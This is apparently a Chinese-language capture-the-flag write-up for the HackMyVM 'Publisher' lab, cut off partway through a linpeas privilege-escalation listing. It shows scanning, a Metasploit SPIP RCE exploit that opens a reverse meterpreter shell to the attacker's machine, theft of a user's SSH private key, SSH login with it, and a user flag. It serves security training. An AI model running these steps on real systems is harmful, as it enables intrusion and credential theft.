{"pageProps":{"postData":{"id":"HackMyVMPublisher","contentHtml":"<h1>Publisher.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=Publisher\">https://hackmyvm.eu/machines/machine.php?vm=Publisher</a></p>\n</blockquote>\n<p>Notes: <strong>I hope you will enjoy it.</strong></p>\n<h2>信息收集</h2>\n<pre><code class=\"hljs language-python\">// 探测主机\nnmap -sP <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.0</span>/<span class=\"hljs-number\">24</span>          \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> 06:<span class=\"hljs-number\">53</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.1</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00057</span>s latency).\nMAC Address: 0A:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.2</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00028</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">77</span>:3D:<span class=\"hljs-number\">23</span> (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00052</span>s latency).\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:AB:D8:DE (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\nHost <span class=\"hljs-keyword\">is</span> up.\n// 扫描端口\nnmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span> \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> 06:<span class=\"hljs-number\">54</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00069</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:AB:D8:DE (Oracle VirtualBox virtual NIC)\n// 扫描版本服务\nnmap -sT -sV -O -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span>         \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> 06:<span class=\"hljs-number\">56</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00077</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">8.2</span>p1 Ubuntu 4ubuntu0<span class=\"hljs-number\">.10</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.41</span> ((Ubuntu))\nMAC Address: 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:AB:D8:DE (Oracle VirtualBox virtual NIC)\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.8</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">24.62</span> seconds\n// 漏洞扫描\nnmap -script=vuln -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span> \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> 06:<span class=\"hljs-number\">59</span> EST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00077</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (reset)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.\n| http-internal-ip-disclosure: \n|_  Internal IP Leaked: <span class=\"hljs-number\">172.17</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.2</span>\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n| http-enum: \n|_  /images/: Potentially interesting directory w/ listing on '</span>apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.41</span> (ubuntu)<span class=\"hljs-string\">'\nMAC Address: 08:00:27:AB:D8:DE (Oracle VirtualBox virtual NIC)\n\n</span></code></pre>\n<p>新装了DVWS尝试一下，结果和nmap扫描的差不多</p>\n<p><img src=\"/post-images/HackMyVMPublisher/image20.png\" alt=\"image.png\"></p>\n<h2>渗透</h2>\n<p>因为此只存在80端口和22端口，所以优先级： <code>80</code> ><code>22</code></p>\n<p>访问一下<code>web</code>页面，蛮复古的，发现内容都是在说<code>spip</code> ，通过搜索发现是一个SPIP是一款开源的<code>CMS</code></p>\n<p><img src=\"/post-images/HackMyVMPublisher/image21.png\" alt=\"image.png\"></p>\n<p>通过点击页面功能没找到可以利用的，扫描一下目录，也是仅发现<code>images</code>文件夹</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span> -e php,<span class=\"hljs-built_in\">zip</span>,txt\n[07:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">301</span> -  315B  - /images  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span>/images/         \n[07:<span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">13</span>] <span class=\"hljs-number\">200</span> -  623B  - /images/\n</code></pre>\n<p>访问一下 <code>/images</code> ，也没啥可以利用的</p>\n<p><img src=\"/post-images/HackMyVMPublisher/image22.png\" alt=\"image.png\"></p>\n<p>尝试查找<code>SPIP</code>的漏洞，发现<code>SPIP</code>发现严重的反序列化漏洞，可以命令执行（<strong><code>CVE-2023-27372</code></strong>）</p>\n<p>直接利用<code>msfconsole</code> 一把梭</p>\n<pre><code class=\"hljs language-python\">msf6 > search spip\n\nMatching Modules\n================\n\n   <span class=\"hljs-comment\">#   Name                                             Disclosure Date  Rank       Check  Description</span>\n   -   ----                                             ---------------  ----       -----  -----------\n   <span class=\"hljs-number\">0</span>   exploit/multi/http/spip_bigup_unauth_rce         <span class=\"hljs-number\">2024</span>-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE\n   <span class=\"hljs-number\">1</span>     \\_ target: PHP In-Memory                       .                .          .      .\n   <span class=\"hljs-number\">2</span>     \\_ target: Unix/Linux Command Shell            .                .          .      .\n   <span class=\"hljs-number\">3</span>     \\_ target: Windows Command Shell               .                .          .      .\n   <span class=\"hljs-number\">4</span>   exploit/multi/http/spip_porte_plume_previsu_rce  <span class=\"hljs-number\">2024</span>-08-<span class=\"hljs-number\">16</span>       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin\n   <span class=\"hljs-number\">5</span>     \\_ target: PHP In-Memory                       .                .          .      .\n   <span class=\"hljs-number\">6</span>     \\_ target: Unix/Linux Command Shell            .                .          .      .\n   <span class=\"hljs-number\">7</span>     \\_ target: Windows Command Shell               .                .          .      .\n   <span class=\"hljs-number\">8</span>   exploit/multi/http/spip_connect_exec             <span class=\"hljs-number\">2012</span>-07-04       excellent  Yes    SPIP connect Parameter PHP Injection\n   <span class=\"hljs-number\">9</span>     \\_ target: PHP In-Memory                       .                .          .      .\n   <span class=\"hljs-number\">10</span>    \\_ target: Unix/Linux Command Shell            .                .          .      .\n   <span class=\"hljs-number\">11</span>    \\_ target: Windows Command Shell               .                .          .      .\n   <span class=\"hljs-number\">12</span>  exploit/multi/http/spip_rce_form                 <span class=\"hljs-number\">2023</span>-02-<span class=\"hljs-number\">27</span>       excellent  Yes    SPIP form PHP Injection\n   <span class=\"hljs-number\">13</span>    \\_ target: PHP In-Memory                       .                .          .      .\n   <span class=\"hljs-number\">14</span>    \\_ target: Unix/Linux Command Shell            .                .          .      .\n   <span class=\"hljs-number\">15</span>    \\_ target: Windows Command Shell               .                .          .      .\nmsf6 > use <span class=\"hljs-number\">0</span>\n[*] No payload configured, defaulting to php/meterpreter/reverse_tcp\n// kali IP\nsf6 exploit(multi/http/spip_bigup_unauth_rce) > <span class=\"hljs-built_in\">set</span> lhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\nlhost => <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>\nmsf6 exploit(multi/http/spip_bigup_unauth_rce) > <span class=\"hljs-built_in\">set</span> rhost <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span>\nrhost => <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span>\nmsf6 exploit(multi/http/spip_bigup_unauth_rce) > <span class=\"hljs-built_in\">set</span> targeturi /spip\ntargeturi => /spip\nmsf6 exploit(multi/http/spip_bigup_unauth_rce) > run\n\n[*] Started reverse TCP handler on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>:<span class=\"hljs-number\">4444</span> \n[*] Running automatic check (<span class=\"hljs-string\">\"set AutoCheck false\"</span> to disable)\n[*] SPIP Version detected: <span class=\"hljs-number\">4.2</span><span class=\"hljs-number\">.0</span>\n[+] SPIP version <span class=\"hljs-number\">4.2</span><span class=\"hljs-number\">.0</span> <span class=\"hljs-keyword\">is</span> vulnerable.\n[*] Bigup plugin version detected: <span class=\"hljs-number\">3.2</span><span class=\"hljs-number\">.1</span>\n[+] The target appears to be vulnerable. Both the detected SPIP version (<span class=\"hljs-number\">4.2</span><span class=\"hljs-number\">.0</span>) <span class=\"hljs-keyword\">and</span> bigup version (<span class=\"hljs-number\">3.2</span><span class=\"hljs-number\">.1</span>) are vulnerable.\n[*] Found formulaire_action: login\n[*] Found formulaire_action_args: CKNOtIY6q36fgXbnaOw3p...\n[*] Preparing to send exploit payload to the target...\n[*] Sending stage (<span class=\"hljs-number\">40004</span> <span class=\"hljs-built_in\">bytes</span>) to <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span>\n[*] Meterpreter session <span class=\"hljs-number\">1</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.4</span>:<span class=\"hljs-number\">4444</span> -> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span>:<span class=\"hljs-number\">56446</span>) at <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> 07:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">36</span> -0500\n\nmeterpreter > \n\n</code></pre>\n<h2>后渗透</h2>\n<p>本来是想获得<code>shell</code>后获得更好的交互而使用<code>python</code>却发现没有<code>python</code></p>\n<h3>信息收集</h3>\n<p>先手动收集信息，发现<code>dockerenv</code> ，现在的<code>shell</code>应该是docker下的</p>\n<pre><code class=\"hljs language-python\">cd /\nls -al\ntotal <span class=\"hljs-number\">64</span>\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2023</span> .\ndrwxr-xr-x   <span class=\"hljs-number\">1</span> root root <span class=\"hljs-number\">4096</span> Dec <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2023</span> ..\n-rwxr-xr-x   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">0</span> Dec <span class=\"hljs-number\">20</span>  <span class=\"hljs-number\">2023</span> .dockerenv\nlrwxrwxrwx   <span class=\"hljs-number\">1</span> root root    <span class=\"hljs-number\">7</span> Oct  <span class=\"hljs-number\">3</span>  <span class=\"hljs-number\">2023</span> <span class=\"hljs-built_in\">bin</span> -> usr/<span class=\"hljs-built_in\">bin</span>\n\ncat /proc/<span class=\"hljs-number\">1</span>/cgroup\n<span class=\"hljs-number\">12</span>:cpuset:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">11</span>:hugetlb:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">10</span>:cpu,cpuacct:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">9</span>:perf_event:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">8</span>:devices:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">7</span>:blkio:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">6</span>:memory:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">5</span>:freezer:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">4</span>:net_cls,net_prio:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">3</span>:pids:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">2</span>:rdma:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">1</span>:name=systemd:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n<span class=\"hljs-number\">0</span>::/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2\n\n</code></pre>\n<p>不过可以注意到，我们的<code>spip</code>是放在一个叫<code>think</code>的用户家目录下，果然有权限访问</p>\n<pre><code class=\"hljs language-python\">meterpreter > ls\nListing: /home/think\n====================\n\nMode              Size  <span class=\"hljs-type\">Type</span>  Last modified              Name\n----              ----  ----  -------------              ----\n020666/rw-rw-rw-  <span class=\"hljs-number\">0</span>     cha   <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">44</span> -0500  .bash_history\n<span class=\"hljs-number\">100644</span>/rw-r--r--  <span class=\"hljs-number\">220</span>   fil   <span class=\"hljs-number\">2023</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">14</span> 03:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">26</span> -0500  .bash_logout\n<span class=\"hljs-number\">100644</span>/rw-r--r--  <span class=\"hljs-number\">3771</span>  fil   <span class=\"hljs-number\">2023</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">14</span> 03:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">26</span> -0500  .bashrc\n040700/rwx------  <span class=\"hljs-number\">4096</span>  <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2023</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">14</span> 03:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">24</span> -0500  .cache\n040700/rwx------  <span class=\"hljs-number\">4096</span>  <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2023</span>-<span class=\"hljs-number\">12</span>-08 08:07:<span class=\"hljs-number\">22</span> -0500  .config\n040700/rwx------  <span class=\"hljs-number\">4096</span>  <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2024</span>-02-<span class=\"hljs-number\">10</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">33</span> -0500  .gnupg\n040775/rwxrwxr-x  <span class=\"hljs-number\">4096</span>  <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2024</span>-01-<span class=\"hljs-number\">10</span> 07:<span class=\"hljs-number\">46</span>:09 -0500  .local\n<span class=\"hljs-number\">100644</span>/rw-r--r--  <span class=\"hljs-number\">807</span>   fil   <span class=\"hljs-number\">2023</span>-<span class=\"hljs-number\">11</span>-<span class=\"hljs-number\">14</span> 03:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">24</span> -0500  .profile\n020666/rw-rw-rw-  <span class=\"hljs-number\">0</span>     cha   <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">44</span> -0500  .python_history\n040755/rwxr-xr-x  <span class=\"hljs-number\">4096</span>  <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2024</span>-01-<span class=\"hljs-number\">10</span> 07:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">17</span> -0500  .ssh\n020666/rw-rw-rw-  <span class=\"hljs-number\">0</span>     cha   <span class=\"hljs-number\">2025</span>-01-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">44</span> -0500  .viminfo\n040750/rwxr-x---  <span class=\"hljs-number\">4096</span>  <span class=\"hljs-built_in\">dir</span>   <span class=\"hljs-number\">2023</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">20</span> <span class=\"hljs-number\">14</span>:05:<span class=\"hljs-number\">25</span> -0500  spip\n<span class=\"hljs-number\">100644</span>/rw-r--r--  <span class=\"hljs-number\">35</span>    fil   <span class=\"hljs-number\">2024</span>-02-<span class=\"hljs-number\">10</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">39</span> -0500  user.txt\n</code></pre>\n<p>注意到SSH文件夹，我们查看一下是否有SSH密钥</p>\n<p>存在，我们将其下载下来</p>\n<pre><code class=\"hljs language-python\">meterpreter > ls\nListing: /home/think/.ssh\n=========================\n\nMode              Size  <span class=\"hljs-type\">Type</span>  Last modified              Name\n----              ----  ----  -------------              ----\n<span class=\"hljs-number\">100644</span>/rw-r--r--  <span class=\"hljs-number\">569</span>   fil   <span class=\"hljs-number\">2024</span>-01-<span class=\"hljs-number\">10</span> 07:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">17</span> -0500  authorized_keys\n<span class=\"hljs-number\">100644</span>/rw-r--r--  <span class=\"hljs-number\">2602</span>  fil   <span class=\"hljs-number\">2024</span>-01-<span class=\"hljs-number\">10</span> 07:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">14</span> -0500  id_rsa\n<span class=\"hljs-number\">100644</span>/rw-r--r--  <span class=\"hljs-number\">569</span>   fil   <span class=\"hljs-number\">2024</span>-01-<span class=\"hljs-number\">10</span> 07:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">14</span> -0500  id_rsa.pub\n\nmeterpreter > download id_rsa\n[*] Downloading: id_rsa -> /root/Desktop/test/Publisher/id_rsa\n[*] Downloaded <span class=\"hljs-number\">2.54</span> KiB of <span class=\"hljs-number\">2.54</span> KiB (<span class=\"hljs-number\">100.0</span>%): id_rsa -> /root/Desktop/test/Publisher/id_rsa\n[*] Completed  : id_rsa -> /root/Desktop/test/Publisher/id_rsa\n</code></pre>\n<h3>SSH密钥利用</h3>\n<p>设置密钥权限</p>\n<pre><code class=\"hljs language-python\">chmod <span class=\"hljs-number\">600</span> id_rsa\n</code></pre>\n<p>使用密钥登录<code>SSH</code>，登陆成功</p>\n<pre><code class=\"hljs language-python\">ssh think@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.11</span> -i id_rsa                                                                                                                        \nThe authenticity of host <span class=\"hljs-string\">'192.168.56.11 (192.168.56.11)'</span> can<span class=\"hljs-string\">'t be established.                                                                               \nED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.                                                                               \nThis key is not known by any other names.                                     \nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 20 Jan 2025 09:08:28 PM UTC\n\n  System load:                      0.07\n  Usage of /:                       74.7% of 9.75GB\n  Memory usage:                     32%\n  Swap usage:                       0%\n  Processes:                        211\n  Users logged in:                  0\n  IPv4 address for br-72fdb218889f: 172.18.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for enp0s3:          192.168.56.11\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Fri Mar 29 13:22:11 2024 from 192.168.109.1\nthink@publisher:~$ \n\n</span></code></pre>\n<h3>UserFlag</h3>\n<p>查看当前文件夹，存在<code>user.txt</code></p>\n<pre><code class=\"hljs language-python\">think@publisher:~$ cat user.txt \nfa229046d44eda6a3598c73ad96f4ca5\n</code></pre>\n<h3>自动化信息收集</h3>\n<p>向靶机传入<code>linpeas.sh</code> ，使用<code>kali</code>创建服务器然后下载到靶机</p>\n<p>给予<code>linpeas.sh</code> 执行权限</p>\n<pre><code class=\"hljs language-python\">think@publisher:~$ chmod u+x [linpeas.sh](http://linpeas.sh/)\n</code></pre>\n<p>执行<code>linpeas.sh</code></p>\n<pre><code class=\"hljs language-python\">think@publisher:~$ ./[linpeas.sh](http://linpeas.sh/)\n</code></pre>\n<p>结果说可能存在<code>CVE-2021-3560</code>  ，但是几个POC都无法使用</p>\n<pre><code class=\"hljs language-python\">Vulnerable to CVE-<span class=\"hljs-number\">2021</span>-<span class=\"hljs-number\">3560</span>                                                                                                                                  \n                                                                                                                                                             \n╔══════════╣ Protections                                                                                                                                     \n═╣ AppArmor enabled? .............. You do <span class=\"hljs-keyword\">not</span> have enough privilege to read the profile <span class=\"hljs-built_in\">set</span>.                                                                apparmor module <span class=\"hljs-keyword\">is</span> loaded.                                                                                                                                   \n═╣ AppArmor profile? .............. /usr/sbin/ash (complain)                                                                                                 \n═╣ <span class=\"hljs-keyword\">is</span> linuxONE? ................... s390x Not Found                                                                                                          \n═╣ grsecurity present? ............ grsecurity Not Found                                                                                                     \n═╣ PaX bins present? .............. PaX Not Found       \n═╣ grsecurity present? ............ grsecurity Not Found                                                                                 08:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">19</span> [<span class=\"hljs-number\">1503</span>/<span class=\"hljs-number\">1808</span>]\n═╣ PaX bins present? .............. PaX Not Found                                                                                                            \n═╣ Execshield enabled? ............ Execshield Not Found                                                                                                     \n═╣ SELinux enabled? ............... sestatus Not Found                                                                                                       \n═╣ Seccomp enabled? ............... disabled                                                                                                                 \n═╣ User namespace? ................ enabled                                                                                                                  \n═╣ Cgroup2 enabled? ............... enabled                                                                                                                  \n═╣ Is ASLR enabled? ............... Yes                                                                                                                      \n═╣ Printer? ....................... No                                                                                                                       \n═╣ Is this a virtual machine? ..... Yes (oracle)    \n</code></pre>\n<p>结果中还发现存在一个未知二进制文件 <code>/usr/sbin/run_container</code></p>\n<pre><code class=\"hljs language-python\">══════════════════════╣ Files <span class=\"hljs-keyword\">with</span> Interesting Permissions ╠══════════════════════                                                                           \n                      ╚════════════════════════════════════╝                                                                                                 \n╔══════════╣ SUID - Check easy privesc, exploits <span class=\"hljs-keyword\">and</span> write perms                                                                                             \n╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html<span class=\"hljs-comment\">#sudo-and-suid                                                              </span>\n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 23K Feb <span class=\"hljs-number\">21</span>  <span class=\"hljs-number\">2022</span> /usr/lib/policykit-<span class=\"hljs-number\">1</span>/polkit-agent-helper-<span class=\"hljs-number\">1</span>                                                                           \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 467K Dec <span class=\"hljs-number\">18</span>  <span class=\"hljs-number\">2023</span> /usr/lib/openssh/ssh-keysign                                                                                        \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 15K Jul  <span class=\"hljs-number\">8</span>  <span class=\"hljs-number\">2019</span> /usr/lib/eject/dmcrypt-get-device                                                                                    \n-rwsr-xr-- <span class=\"hljs-number\">1</span> root messagebus 51K Oct <span class=\"hljs-number\">25</span>  <span class=\"hljs-number\">2022</span> /usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper                                                                    \n-rwsr-sr-x <span class=\"hljs-number\">1</span> root root 15K Dec <span class=\"hljs-number\">13</span>  <span class=\"hljs-number\">2023</span> /usr/lib/xorg/Xorg.wrap                                                                                              \n-rwsr-xr-- <span class=\"hljs-number\">1</span> root dip 386K Jul <span class=\"hljs-number\">23</span>  <span class=\"hljs-number\">2020</span> /usr/sbin/pppd  --->  Apple_Mac_OSX_10<span class=\"hljs-number\">.4</span><span class=\"hljs-number\">.8</span>(05-<span class=\"hljs-number\">2007</span>)                                                                  \n-rwsr-sr-x <span class=\"hljs-number\">1</span> root root 17K Nov <span class=\"hljs-number\">14</span>  <span class=\"hljs-number\">2023</span> /usr/sbin/run_container (Unknown SUID binary!)                                                                       \n-rwsr-sr-x <span class=\"hljs-number\">1</span> daemon daemon 55K Nov <span class=\"hljs-number\">12</span>  <span class=\"hljs-number\">2018</span> /usr/<span class=\"hljs-built_in\">bin</span>/at  --->  RTru64_UNIX_4<span class=\"hljs-number\">.0</span>g(CVE-<span class=\"hljs-number\">2002</span>-<span class=\"hljs-number\">1614</span>)                                                               \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 39K Mar  <span class=\"hljs-number\">7</span>  <span class=\"hljs-number\">2020</span> /usr/<span class=\"hljs-built_in\">bin</span>/fusermount                                                                                                  \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 87K Nov <span class=\"hljs-number\">29</span>  <span class=\"hljs-number\">2022</span> /usr/<span class=\"hljs-built_in\">bin</span>/gpasswd                                                                                                     \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 84K Nov <span class=\"hljs-number\">29</span>  <span class=\"hljs-number\">2022</span> /usr/<span class=\"hljs-built_in\">bin</span>/chfn  --->  SuSE_9<span class=\"hljs-number\">.3</span>/<span class=\"hljs-number\">10</span>                                                                                     \n-rwsr-xr-x <span class=\"hljs-number\">1</span> root root 163K Apr  <span class=\"hljs-number\">4</span>  <span class=\"hljs-number\">2023</span> /usr/<span class=\"hljs-built_in\">bin</span>/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                        \n-rwsr-xr-x <span class=\"hljs-number\">1</span> 